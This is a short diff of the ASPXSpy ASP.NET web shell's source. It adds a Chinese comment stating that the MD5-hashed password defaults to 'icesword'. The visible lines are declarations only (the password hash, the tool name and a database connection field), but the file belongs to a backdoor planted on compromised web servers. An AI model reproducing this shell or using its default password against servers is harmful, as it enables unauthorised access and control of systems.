@@ -21,7 +21,7 @@
 <%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <script runat="server">
-public string Password="571df1818893b45ad4fd9697b55b3679";//
+public string Password="571df1818893b45ad4fd9697b55b3679";//密码为MD5加密，默认为：icesword
 public string vbhLn="ASPXSpy";
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
